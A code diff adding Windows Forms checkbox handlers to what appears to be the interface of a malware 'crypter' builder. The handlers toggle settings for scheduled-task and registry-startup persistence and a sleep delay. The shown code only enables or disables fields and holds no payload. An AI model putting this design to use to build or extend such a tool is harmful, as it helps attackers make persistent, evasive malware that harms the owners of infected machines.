@@ -58,5 +58,65 @@ namespace _2Simple_Crypter
             this.WindowState = FormWindowState.Minimized;
         }
         #endregion
+
+        private void schtasksBox_CheckedChanged(object sender, EventArgs e)
+        {
+            if (schtasksChk.Checked)
+            {
+                filenameTxt.Enabled = true;
+                foldernameTxt.Enabled = true;
+                specialBox.Enabled = true;
+                schtasksNameTxt.Enabled = true;
+            }
+            else
+            {
+                schtasksNameTxt.Enabled = false;
+            }
+
+            if (schtasksChk.CheckState == CheckState.Unchecked)
+            {
+                schtasksNameTxt.Enabled = false;
+                filenameTxt.Enabled = false;
+                foldernameTxt.Enabled = false;
+                specialBox.Enabled = false;
+                regeditNameTxt.Enabled = false;
+            }
+        }
+
+        private void regeditChk_CheckedChanged(object sender, EventArgs e)
+        {
+            if (regeditChk.CheckState == CheckState.Checked)
+            {
+                filenameTxt.Enabled = true;
+                foldernameTxt.Enabled = true;
+                specialBox.Enabled = true;
+                regeditNameTxt.Enabled = true;
+            }
+            else
+            {
+                regeditNameTxt.Enabled = false;
+            }
+
+            if (regeditChk.CheckState == CheckState.Unchecked)
+            {
+                regeditNameTxt.Enabled = false;
+                filenameTxt.Enabled = false;
+                foldernameTxt.Enabled = false;
+                specialBox.Enabled = false;
+                regeditNameTxt.Enabled = false;
+            }
+        }
+
+        private void sleepChk_CheckedChanged(object sender, EventArgs e)
+        {
+            if(sleepChk.CheckState == CheckState.Checked)
+            {
+                sleepNum.Enabled = true;
+            }
+            else
+            {
+                sleepNum.Enabled = false;
+            }
+        }
     }
 }
